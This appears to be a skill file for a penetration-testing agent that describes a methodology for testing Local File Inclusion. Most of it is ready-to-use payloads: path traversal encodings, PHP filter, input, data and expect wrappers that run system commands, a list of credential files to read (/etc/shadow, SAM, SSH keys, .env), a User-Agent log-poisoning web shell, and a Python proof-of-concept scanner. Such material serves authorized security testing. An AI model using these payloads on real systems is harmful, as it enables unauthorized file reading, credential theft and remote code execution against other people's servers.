---
name: lfi
description: Local File Inclusion testing methodology
version: 1.0.0
tags: [injection, file, A03:2021]
---

# LFI Testing Methodology

## Overview
LFI allows attackers to include files from the server, potentially reading sensitive data or achieving RCE.

## Basic Payloads
```
../../../etc/passwd
....//....//....//etc/passwd
..%2f..%2f..%2fetc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
....\/....\/....\/etc/passwd
```

## Null Byte Injection (PHP <5.3)
```
../../../etc/passwd%00
../../../etc/passwd%00.jpg
```

## Path Truncation (Windows)
```
../../../etc/passwd.......................
```

## Wrapper Payloads

### PHP Filters
```
php://filter/convert.base64-encode/resource=/etc/passwd
php://filter/read=string.rot13/resource=/etc/passwd
```

### PHP Input (RCE)
```
php://input
POST data: <?php system('id'); ?>
```

### Data Wrapper
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
```

### Expect Wrapper
```
expect://id
```

### ZIP Wrapper
```
zip://shell.jpg%23shell.php
```

## Common Files to Read

### Linux
```
/etc/passwd
/etc/shadow
/etc/hosts
/proc/self/environ
/proc/self/cmdline
/var/log/apache2/access.log
~/.ssh/id_rsa
```

### Windows
```
C:\Windows\System32\config\SAM
C:\Windows\win.ini
C:\inetpub\wwwroot\web.config
```

### Application
```
../config/database.yml
../.env
../wp-config.php
```

## Log Poisoning (RCE)
```
# Inject PHP in User-Agent
User-Agent: <?php system($_GET['cmd']); ?>

# Include the log
../../../var/log/apache2/access.log&cmd=id
```

## PoC Template
```python
import requests
import base64

def test_lfi(url, param):
    payloads = [
        '../../../etc/passwd',
        'php://filter/convert.base64-encode/resource=/etc/passwd',
    ]
    
    for payload in payloads:
        r = requests.get(url, params={param: payload})
        
        if 'root:' in r.text:
            print(f"[+] LFI found with: {payload}")
            return True
        
        # Check for base64 encoded output
        try:
            decoded = base64.b64decode(r.text)
            if b'root:' in decoded:
                print(f"[+] LFI found (base64): {payload}")
                return True
        except:
            pass
    
    return False
```

## Impact
- Read sensitive files
- Source code disclosure
- Credential theft
- Remote Code Execution (via log poisoning)
